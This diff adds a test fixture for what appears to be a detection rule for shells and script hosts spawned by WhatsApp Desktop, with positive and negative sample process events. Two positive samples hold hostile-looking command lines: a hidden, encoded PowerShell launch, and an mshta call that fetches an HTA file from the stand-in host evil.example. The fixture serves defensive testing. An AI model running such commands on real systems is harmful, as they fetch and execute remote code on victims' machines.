@@ -1,0 +1,30 @@
+positive:
+  - name: PowerShell launched from WhatsApp after opening a lure
+    event:
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgA
+      ParentImage: C:\Program Files\WindowsApps\5319275A.WhatsAppDesktop_2.2449.4.0_x64__cv1g1gvanyjgm\WhatsApp.exe
+      User: ATS\ops.desk
+  - name: mshta from WhatsApp Desktop
+    event:
+      Image: C:\Windows\System32\mshta.exe
+      CommandLine: mshta.exe http://evil.example/invoice.hta
+      ParentImage: C:\Users\ops\AppData\Local\WhatsApp\WhatsApp.exe
+  - name: Case-insensitive match
+    event:
+      Image: c:\windows\system32\CMD.EXE
+      ParentImage: C:\Users\ops\AppData\Local\WHATSAPP\WhatsApp.exe
+negative:
+  - name: WhatsApp spawning its own renderer
+    event:
+      Image: C:\Users\ops\AppData\Local\WhatsApp\WhatsApp.exe
+      CommandLine: WhatsApp.exe --type=renderer
+      ParentImage: C:\Users\ops\AppData\Local\WhatsApp\WhatsApp.exe
+  - name: PowerShell from Explorer
+    event:
+      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      ParentImage: C:\Windows\explorer.exe
+  - name: Unrelated app with similar name as parent
+    event:
+      Image: C:\Windows\System32\cmd.exe
+      ParentImage: C:\Tools\WhatsAppBackupTool.exe
